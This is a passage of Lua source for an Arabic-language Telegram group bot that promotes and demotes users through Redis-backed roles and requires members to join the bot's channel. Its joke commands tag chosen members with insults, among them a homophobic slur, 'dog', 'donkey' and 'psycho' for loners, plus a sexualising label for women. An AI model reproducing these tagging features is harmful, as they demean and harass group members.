if TextMsg == "غبي" then
if not Redis:sismember(darket.."8by:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠يارب تعقل وتبقا ذكي 😂   🙃 ").Reply,"md",true)  
else
Redis:srem(darket.."8by:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠خير اهو شغل مخك اهو نزلناك من الاغبياء🌚 ").Reply,"md",true)  
end
end
end


if text and text:match('^تنزيل (.*) (%d+)$') then
local UserId = {text:match('^تنزيل (.*) (%d+)$')}
local UserInfo = LuaTele.getUser(UserId[2])
if UserInfo.luatele == "error" and UserInfo.code == 6 then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام ايدي خطأ ","md",true)  
end
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if UserId[1] == 'مطور ثانوي' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Devss:Groups",UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم تنزيله مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Devss:Groups",UserId) 
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم تنزيله مطور ثانوي").Reply,"md",true)  
end
end
if UserId[1] == 'مطور' then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Dev:Groups",UserId) then
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم تنزيله مطور مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Dev:Groups",UserId) 
return send(msg_chat_id,msg_id,Reply_Status(UserId,"٠ تم تنزيله مطور ").Reply,"md",true)  
end
end
if UserId[1] == "مالك" then
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if not Redis:sismember(darket.."Owners:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله مالك مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Owners:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله مالك ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ اساسي" then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Supcreator:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Supcreator:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله منشئ اساسي ").Reply,"md",true)  
end
end
if UserId[1] == "منشئ" then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Creator:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله من المنشئين مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Creator:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله من المنشئين ").Reply,"md",true)  
end
end
if UserId[1] == "مدير" then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Manger:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله من المدراء مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Manger:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله من المدراء ").Reply,"md",true)  
end
end
if UserId[1] == "ادمن" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Admin:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله من الادمنيه مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Admin:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله من الادمنيه ").Reply,"md",true)  
end
end
if UserId[1] == "مميز" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not Redis:sismember(darket.."Special:Group"..msg_chat_id,UserId[2]) then
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله من المميزين مسبقا ").Reply,"md",true)  
else
Redis:srem(darket.."Special:Group"..msg_chat_id,UserId[2]) 
return send(msg_chat_id,msg_id,Reply_Status(UserId[2],"٠ تم تنزيله من المميزبن ").Reply,"md",true)  
end
end
end
if text and text:match('^رفع (.*) @(%S+)$') then
local UserName = {text:match('^رفع (.*) @(%S+)$')}
local UserId_Info = LuaTele.searchPublicChat(UserName[2])
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName[2]:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if UserName[1] == "مطور ثانوي" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Devss:Groups",UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Devss:Groups",UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مطور ثانوي").Reply,"md",true)  
end
end
if UserName[1] == "مطور" then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Dev:Groups",UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مطور مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Dev:Groups",UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مطور ").Reply,"md",true)  
end
end
if UserName[1] == "مالك" then
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if Redis:sismember(darket.."Owners:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مالك مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Owners:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مالك ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ اساسي" then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Supcreator:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Supcreator:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته منشئ اساسي ").Reply,"md",true)  
end
end
if UserName[1] == "منشئ" then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Creator:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Creator:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته منشئ  ").Reply,"md",true)  
end
end
if UserName[1] == "مدير" then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Manger:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مدير  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Manger:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مدير  ").Reply,"md",true)  
end
end
if UserName[1] == "ادمن" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(darket.."Status:SetId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(darket.."Admin:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Admin:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته ادمن  ").Reply,"md",true)  
end
end
if UserName[1] == "مميز" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(darket.."Status:SetId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(darket.."Special:Group"..msg_chat_id,UserId_Info.id) then
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مميز  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Special:Group"..msg_chat_id,UserId_Info.id) 
return send(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"٠ تم ترقيته مميز  ").Reply,"md",true)  
end
end
---تسليه بالمعرف---
end
if text and text:match("^رفع (.*)$") and msg.reply_to_message_id ~= 0 then
local TextMsg = text:match("^رفع (.*)$")
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if TextMsg == 'مطور ثانوي' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Devss:Groups",Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Devss:Groups",Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مطور ثانوي").Reply,"md",true)  
end
end
if TextMsg == 'مطور' then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Dev:Groups",Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مطور مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Dev:Groups",Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مطور ").Reply,"md",true)  
end
end
if TextMsg == "مالك" then
if not msg.Dev then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(3)..' * ',"md",true)  
end
if Redis:sismember(darket.."Owners:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مالك مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Owners:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مالك ").Reply,"md",true)  
end
end
if TextMsg == "منشئ اساسي" then
if not msg.Supcreatorm then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Supcreator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته منشئ اساسي ").Reply,"md",true)  
end
end
if TextMsg == "منشئ" then
if not msg.Supcreator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(4)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Creator:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Creator:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته منشئ  ").Reply,"md",true)  
end
end
if TextMsg == "مدير" then
if not msg.Creator then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(5)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."Manger:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مدير  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Manger:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مدير  ").Reply,"md",true)  
end
end
if TextMsg == "ادمن" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(darket.."Status:SetId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(darket.."Admin:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Admin:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته ادمن  ").Reply,"md",true)  
end
end
if TextMsg == "مميز" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if not msg.Creator and not Redis:get(darket.."Status:SetId"..msg_chat_id) then
return send(msg_chat_id,msg_id,"٠ تم تعطيل (الرفع) من قبل المنشئين","md",true)
end 
if Redis:sismember(darket.."Special:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مميز  مسبقا ").Reply,"md",true)  
else
Redis:sadd(darket.."Special:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته مميز  ").Reply,"md",true)  
end
end
---تسليه بالرد
if TextMsg == "خول" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."kholat:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠محطوط ف قايمة الخولات من  بدري 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."kholat:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم ترقيته خول بالمجموعة لما يسترجل هننزلو 😂  ").Reply,"md",true)  
end
end
if TextMsg == "وتكه" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."wtka:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠دي اجمد بنوته هنا ف القايمة من بدري يباشه 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."wtka:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ جامدة وتستاهل بصراحة تترفع وتكه 😂  ").Reply,"md",true)  
end
end
if TextMsg == "متوحد" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠دا مولود كده ومحطوط عندنا من زمان 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم رفعه متوحد  كنت شاكك فيه انو سايكو😂  ").Reply,"md",true)  
end
end
if TextMsg == "متوحده" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠دا مولود كده ومحطوط عندنا من زمان 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."twhd:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم رفعه متوحد  كنت شاكك فيه انو سايكو😂  ").Reply,"md",true)  
end
end
if TextMsg == "كلب" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."klb:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠دا مولود كده ومحطوط عندنا من زمان بيشمشم علي اي بنت 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."klb:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم رفعه كلب خليه يجي ياخد عضمه😂  ").Reply,"md",true)  
end
end
if TextMsg == "حمار" then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(darket.."mar:Group"..msg_chat_id,Message_Reply.sender.user_id) then
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠نزلناه من زمان وفكينا الكارو 😂 😂 ").Reply,"md",true)  
else
Redis:sadd(darket.."mar:Group"..msg_chat_id,Message_Reply.sender.user_id) 
return send(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"٠ تم رفعه حمار خليه يجي نركبلو عربية كرو😂  ").Reply,"md",true)  
end
end
if TextMsg == "سمب" then
if ChannelJoin(msg) == false then
